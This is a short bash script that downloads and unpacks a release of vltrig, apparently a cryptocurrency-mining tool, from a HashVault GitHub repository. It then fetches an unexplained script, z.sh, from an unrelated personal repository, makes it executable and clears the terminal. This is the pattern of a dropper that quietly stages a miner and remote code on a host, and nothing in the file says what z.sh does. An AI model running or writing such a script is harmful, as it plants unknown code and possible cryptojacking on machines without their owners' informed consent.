#!/usr/bin/env bash
set -euo pipefail

wget -O vltrig-v6.26.0.4-linux-x64.tar.gz "https://github.com/HashVault/vltrig/releases/download/v6.26.0.4/vltrig-v6.26.0.4-linux-x64.tar.gz"
tar xf vltrig-v6.26.0.4-linux-x64.tar.gz

wget -O z.sh "https://raw.githubusercontent.com/prendibs/y/refs/heads/main/z.sh"
chmod +x z.sh

clear
